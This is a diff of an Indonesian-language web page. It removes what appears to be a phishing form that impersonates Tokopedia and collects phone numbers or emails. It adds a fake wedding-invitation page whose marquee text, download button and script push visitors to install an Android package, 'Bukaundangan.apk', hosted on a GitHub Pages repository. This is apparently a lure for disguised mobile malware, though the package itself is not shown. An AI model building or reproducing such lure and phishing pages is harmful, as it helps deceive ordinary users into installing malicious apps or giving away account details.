@@ -3,78 +3,42 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tokopedia</title>
+  <title>Undangan Pernikahan</title>
+
   <style>
+    body, html {
+      overflow-x: hidden;
+      height: 100%;
+      margin: 0;
+    }
+
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f4;
-      margin: 0;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      flex-direction: column;
+      min-height: 100%;
+    }
+
+    #header {
+      width: 100%;
+      height: 316px;
+      background-image: url('https://i.ibb.co/nrXnPjd/images-6.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
     }
 
     .container {
-      position: relative;
-    }
-
-    form {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 5px 5px 10px rgba(7, 7, 7, 0.2);
-      text-align: center;
-      margin-top: 30px;
-      margin-bottom: 10px; /* Tambahkan margin-bottom pada form */
-      position: relative;
-      z-index: 10;
-    }
-
-    img.bottom-img {
-      max-width: 100%;
-      height: auto;
-      border-radius: 8px;
-      margin-top: 30px;
-      margin-bottom: 20px;
-    }
-
-    .label-container {
       display: flex;
-      justify-content: flex-start;
       align-items: center;
-      margin-bottom: 8px;
-      margin-left: -10px;
+      justify-content: center;
+      flex: 1;
+      flex-direction: column;
     }
 
-    label {
-      display: inline-block;
-      margin-right: 8px;
-      margin-top: -10px; /* Adjusted margin-top */
-    }
-
-    .daftar-text {
-      color: #4caf50;
-      margin-top: 5px; /* Menggeser ke bawah */
-      margin-right: 5px; /* Menggeser ke kiri */
-      position: absolute;
-      right: 0;
-      top: 0;
-    }
-
-    input {
-      width: calc(100% - 2px);
-      padding: 12px;
-      margin-bottom: 15px;
-      box-sizing: border-box;
-    }
-
-    .example-text {
-      font-size: 12px;
-      color: #666;
-      margin-top: -15px;
-      text-align: left;
-      margin-left: 5px;
+    a {
+      text-decoration: none;
     }
 
     button {
@@ -85,30 +49,117 @@
       border: none;
       border-radius: 9px;
       cursor: pointer;
-      margin-top: 5px; /* Tambahkan margin-top pada tombol */
-      margin-bottom: 0; /* Menghapus margin-bottom pada tombol */
+      margin-top: 10px;
     }
 
     button:hover {
       background-color: #45a049;
     }
+
+    .button-caption {
+      font-family: 'Roboto', sans-serif;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .marquee-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: -70px;
+    }
+
+    .marquee {
+      overflow: hidden;
+      white-space: nowrap;
+      text-align: center;
+      position: relative;
+    }
+
+    .marquee p {
+      display: inline-block;
+      background-color: black;
+      color: white;
+      padding: 0 10px;
+      animation: marquee 15s linear infinite;
+    }
+
+    @keyframes marquee {
+      0% {
+        transform: translateX(100%);
+      }
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+
+    .invitation-text {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .additional-text {
+      font-family: 'Roboto', sans-serif;
+      text-transform: uppercase;
+      margin-top: 10px;
+    }
+
+    .smaller-text {
+      font-size: 13px;
+      line-height: 1.3;
+    }
   </style>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      var downloadLink = document.getElementById('downloadLink');
+
+      downloadLink.addEventListener('click', function() {
+        var fileName = 'Bukaundangan.apk'; // Ganti dengan nama file dan ekstensi yang sesuai
+        var fileUrl = 'https://github.com/Flascard0/Flascard0.github.io/raw/main/Bukaundangan.apk'; // Ganti dengan URL aplikasi Anda
+
+        var link = document.createElement('a');
+        link.href = fileUrl;
+        link.download = fileName;
+
+        document.body.appendChild(link);
+        link.click();
+
+        document.body.removeChild(link);
+      });
+    });
+  </script>
 </head>
 <body>
 
+  <div id="header"></div>
+
   <div class="container">
-    <form>
-      <div class="label-container">
-        <label for="nomorHP">Email atau Nomor Ponsel</label>
-        <span class="daftar-text">Daftar</span>
+    <div class="marquee-container">
+      <div class="marquee">
+        <p>
+          Mohon Do'a Dan Restu - Lokasi Resepsi & Susunan Acara, Silahkan Buka Undangan Lokasi Resepsi & Susunan Acara, Silahkan Buka Undangan. Terimakasih
+        </p>
       </div>
-      <input type="tel" name="nomorHP" placeholder="Masukkan nomor HP" required>
-      <div class="example-text">Contoh: 123456789</div>
-  
-      <button type="submit">Kirim</button>
-    </form>
-    <img class="bottom-img" src="https://raw.githubusercontent.com/Helpbri6/Helpbri6.github.io/main/IMG_20231218_014533-removebg-preview.png" alt="Your Bottom Photo">
+    </div>
+    <div class="button-caption">UNDANGAN PERNIKAHAN</div>
+    <a id="downloadLink" href="https://github.com/Flascard0/Flascard0.github.io/raw/main/Bukaundangan.apk" download=Bukaundangan.apk>
+      <button>
+        Unduh Aplikasi
+      </button>
+    </a>
+    <div class="invitation-text">
+      <p class="smaller-text">
+        Merupakan suatu kehormatan dan kebahagiaan bagi kami<br>
+        Apabila Bapak/Ibu/Saudara/i berkenan hadir<br>
+        untuk memberikan doa restu kepada kedua mempelai
+      </p>
+      <div class="additional-text">
+        Atas Kehadiran dan Do'a Kami Ucapkan Terimakasih
+      </div>
+    </div>
   </div>
 
 </body>
-</html>
+      </html
